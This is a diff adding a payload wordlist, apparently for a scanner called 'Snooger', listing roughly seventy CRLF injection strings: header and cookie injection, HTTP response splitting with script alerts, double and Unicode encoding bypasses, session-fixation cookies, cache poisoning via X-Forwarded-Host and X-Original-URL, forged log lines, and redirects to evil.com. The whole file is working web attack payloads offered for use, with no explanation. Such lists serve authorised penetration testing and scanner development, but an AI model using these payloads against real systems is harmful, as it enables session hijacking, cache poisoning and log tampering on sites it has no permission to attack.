@@ -1,0 +1,76 @@
+# Snooger CRLF Injection Payloads — 80+ real payloads
+# Categories: Header Injection, Cookie Injection, Response Splitting, Encoding
+# ============================================================================
+
+# === Basic CRLF Header Injection ===
+%0d%0aSet-Cookie:crlf=injected
+%0d%0aInjected-Header:true
+%0d%0aX-Injected:true
+%0aSet-Cookie:crlf=injected
+%0dSet-Cookie:crlf=injected
+%0d%0aLocation:http://evil.com
+%0d%0aContent-Length:0%0d%0a%0d%0a
+%0d%0aContent-Type:text/html%0d%0a%0d%0a<script>alert(1)</script>
+\r\nSet-Cookie:crlf=injected
+\r\nInjected-Header:true
+\nSet-Cookie:crlf=injected
+
+# === Response Splitting ===
+%0d%0a%0d%0a<html><body>CRLF</body></html>
+%0d%0a%0d%0a<script>alert(1)</script>
+%0d%0a%0d%0aHTTP/1.1 200 OK%0d%0aContent-Type:text/html%0d%0a%0d%0a<html>SPLIT</html>
+%0d%0aHTTP/1.1%20200%20OK%0d%0aSet-Cookie:%20session=evil%0d%0a%0d%0a
+%0d%0aContent-Length:35%0d%0a%0d%0a<html>Response Splitting</html>
+
+# === Double Encoded ===
+%250d%250aSet-Cookie:crlf=injected
+%250d%250aInjected-Header:true
+%25250d%25250aSet-Cookie:crlf=injected
+%E5%98%8D%E5%98%8ASet-Cookie:crlf=injected
+%E5%98%8D%E5%98%8AInjected:true
+%C4%8D%C4%8ASet-Cookie:crlf=injected
+
+# === Unicode/UTF-8 ===
+\u000d\u000aSet-Cookie:crlf=injected
+\u000aSet-Cookie:crlf=injected
+\u000dSet-Cookie:crlf=injected
+%c0%8d%c0%8aSet-Cookie:crlf=injected
+%e0%80%8d%e0%80%8aSet-Cookie:crlf=injected
+%E5%98%8D%E5%98%8A%E5%98%8D%E5%98%8ASet-Cookie:crlf=injected
+嘍嘊Set-Cookie:crlf=injected
+
+# === Browser Specific ===
+%0d%0aSet-Cookie:crlf=injected;HttpOnly;Secure
+%0d%0aSet-Cookie:crlf=injected;Domain=.target.com
+%0d%0aSet-Cookie:crlf=injected;Path=/
+%0d%0aSet-Cookie:session=malicious_session_id
+
+# === Header-Based Injection Points ===
+X-Forwarded-Host: evil.com%0d%0aInjected:true
+Host: evil.com%0d%0aX-Injected:true
+Referer: http://evil.com%0d%0aSet-Cookie:crlf=injected
+User-Agent: test%0d%0aInjected:true
+
+# === Cache Poisoning via CRLF ===
+%0d%0aX-Forwarded-Host:evil.com
+%0d%0aX-Original-URL:/admin
+%0d%0aX-Rewrite-URL:/admin
+
+# === Log Injection ===
+%0d%0a[CRITICAL] Unauthorized access detected
+%0d%0a200 admin /admin/delete
+%0d%0d%0a%0aadmin logged in successfully
+
+# === Null Byte + CRLF ===
+%00%0d%0aSet-Cookie:crlf=injected
+%00%0d%0aInjected:true
+
+# === Tab Separated ===
+%09Set-Cookie:crlf=injected
+%09%09Set-Cookie:crlf=injected
+
+# === URL Path Injection ===
+/page%0d%0aSet-Cookie:crlf=injected
+/page%0d%0aLocation:http://evil.com
+/page%E5%98%8D%E5%98%8ASet-Cookie:crlf=injected
+/page%0d%0a%0d%0a<img src=x onerror=alert(1)>
